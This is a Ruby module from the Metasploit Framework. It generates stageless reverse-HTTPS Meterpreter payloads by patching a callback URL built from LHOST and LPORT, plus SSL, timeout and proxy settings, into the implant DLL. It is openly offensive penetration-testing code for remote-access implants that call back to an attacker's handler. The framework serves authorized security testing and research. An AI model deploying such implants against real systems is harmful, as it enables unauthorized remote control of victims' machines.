##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/parser/x509_certificate'

module Msf

##
#
# Helper functionality for handling of stageless http(s) payloads
#
##

module Handler::ReverseHttp::Stageless

  include Msf::Payload::Windows::VerifySsl

  def initialize_stageless
    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
    ], self.class)
  end

  def generate_stageless(&block)
    checksum = generate_uri_checksum(Handler::ReverseHttp::UriChecksum::URI_CHECKSUM_CONN)
    rand = Rex::Text.rand_text_alphanumeric(16)
    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}/#{checksum}_#{rand}/"

    unless block_given?
      raise ArgumentError, "Stageless generation requires a block argument"
    end

    # invoke the given function to generate the architecture specific payload
    block.call(url) do |dll|

      # TODO: figure out this bit
      # patch the target ID into the URI if specified
      #if opts[:target_id]
      #  i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
      #  if i
      #    t = opts[:target_id].to_s
      #    raise "Target ID must be less than 5 bytes" if t.length > 4
      #    u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
      #    print_status("Patching Target ID #{t} into DLL")
      #    dll[i, u.length] = u
      #  end
      #end

      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                           datastore['HandlerSSLCert'])

      Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
        :url            => url,
        :ssl            => true,
        :ssl_cert_hash  => verify_cert_hash,
        :expiration     => datastore['SessionExpirationTimeout'].to_i,
        :comm_timeout   => datastore['SessionCommunicationTimeout'].to_i,
        :ua             => datastore['MeterpreterUserAgent'],
        :proxyhost      => datastore['PROXYHOST'],
        :proxyport      => datastore['PROXYPORT'],
        :proxy_type     => datastore['PROXY_TYPE'],
        :proxy_username => datastore['PROXY_USERNAME'],
        :proxy_password => datastore['PROXY_PASSWORD'])
    end

  end

end

end
